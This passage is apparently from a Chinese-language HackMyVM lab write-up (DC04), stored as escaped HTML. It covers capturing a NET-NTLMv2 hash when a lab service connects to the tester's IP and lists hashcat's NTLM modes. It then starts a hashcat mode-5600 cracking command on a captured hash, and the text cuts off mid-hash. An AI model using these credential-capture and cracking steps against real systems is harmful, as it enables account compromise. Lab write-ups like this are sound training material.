             [ON]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后在输入框输入我们的\u003ccode\u003eIP\u003c/code\u003e 然后点击\u003ccode\u003econnect\u003c/code\u003e ，就能捕获到\u003ccode\u003eNET-NTLM hash\u003c/code\u003e ，一般是用来破解，破解不出来的话就是进行\u003ccode\u003eNTLM relay\u003c/code\u003e攻击，但是在我们单台主机渗透的操作中，是无效的，因为\u003ccode\u003eNTLM relay\u003c/code\u003e攻击是不能重放到凭据真正持有者的主机\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMDC04/image96.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们使用\u003ccode\u003ehashcat\u003c/code\u003e将其进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/DC04  hashcat -h | grep NTLM  \n   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol\n  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol\n   5600 | NetNTLMv2                                                  | Network Protocol\n  27100 | NetNTLMv2 (NT)                                             | Network Protocol\n   1000 | NTLM                                                       | Operating System\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~/Desktop/test/DC04  hashcat -m 5600 \u003cspan class=\"hljs-string\"\u003e'websvc::soupedecode:784a7be8df22a16f:1FE1FEC178ED7B18FA89DC16CDE89488:0101000000000000009A9D509E7EDB01C216B1F03DB493F10000000002000800370033004C00490001001E00570049004E002D00490031004B004E00460055004B00440052004600310004003400570049004E002D00490031004B004E00460055004B0044005200460031002E00370033004C0049002E004C004F00430041004C0003001400370033004C0049002E004C004F00430041004C0005001400370033004C0049002E004C004F00430041004C0007000800009A9D509E7EDB01060004000200000008003000300000000000000000000000004000000C359CCD8231F583E880A5BB37086129D25FBB6C514ED014EEA3D775A8FC2F8F0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E
